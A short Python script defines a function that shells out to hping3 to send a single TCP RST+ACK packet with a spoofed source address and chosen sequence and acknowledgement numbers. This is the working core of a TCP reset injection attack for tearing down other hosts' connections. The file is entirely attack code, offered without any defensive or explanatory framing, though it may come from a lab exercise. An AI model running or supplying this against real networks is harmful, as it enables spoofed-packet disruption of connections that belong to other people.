import subprocess


def send_rst(source_ip, source_port, destination_ip, destination_port, seq, ack):
    print("\n========== RST PACKET ==========")
    print(f"Source      : {source_ip}:{source_port}")
    print(f"Destination : {destination_ip}:{destination_port}")
    print(f"SEQ         : {seq}")
    print(f"ACK         : {ack}")
    print("Flags       : RST + ACK")
    print("================================")

    command = [
        "hping3",
        "--count",
        "1",
        "-a",
        source_ip,
        "--baseport",
        str(source_port),
        "--destport",
        str(destination_port),
        "--setseq",
        str(seq),
        "--setack",
        str(ack),  # <-- critical: set ACK number
        "--rst",
        "--ack",  # <-- critical: set ACK flag
        destination_ip,
    ]

    print("\n[+] Executing hping3...")
    print("[+] Command: ", " ".join(command))

    try:
        result = subprocess.run(
            command,
            capture_output=True,
            text=True,
            check=False,  # don't throw; hping3 often exits non-zero
        )
    except FileNotFoundError:
        print("[!] hping3 not found. Install it first (sudo apt install hping3).")
        return

    print("\n========== HPING3 OUTPUT ==========")
    print(result.stdout or "(no stdout)")

    if result.stderr:
        print("[stderr]", result.stderr)

    print(f"[+] hping3 return code: {result.returncode}")
    print("====================================")
